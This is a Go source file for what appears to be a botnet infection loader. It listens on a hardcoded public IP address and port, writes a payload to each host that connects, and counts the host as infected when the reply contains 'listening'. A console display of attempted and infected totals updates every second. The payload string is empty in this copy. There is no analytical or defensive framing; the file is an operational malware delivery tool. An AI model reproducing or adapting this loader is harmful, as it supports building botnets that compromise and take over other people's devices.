package main

import (
	"fmt"
    "net"
    "time"
    "strings"
)

var payload string = `
`
var dirChange, statusAttempted, statusInfected, echoDropped, statusFailed int

func zeroByte(a []byte) {
    for i := range a {
        a[i] = 0
    }
}

func loaderThread(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 512)
	conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

	conn.Write([]byte(payload))

	statusAttempted++
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	for {
		le, err := conn.Read(buf)
		if err != nil || le <= 0 {
			break
		}

		if strings.Contains(string(buf), "listening") {
			statusInfected++
			break
		}
	}

	zeroByte(buf)
	return
}

func main() {

	li, err := net.Listen("tcp", "45.148.10.65:9832")
	if err != nil {
		return
    }

	var i int = 0
	go func() {
		for {
			fmt.Printf("%d's | Attempted %d | Infected %d\r\n", i, statusAttempted, statusInfected)
			time.Sleep(1 * time.Second)
			i++
		}
	} ()

	go func() {
		for {
			conn, err := li.Accept()
			if err != nil {
				break
			}

			go loaderThread(conn)
		}
	} ()

    for {
        time.Sleep(1 * time.Second)
    }
}
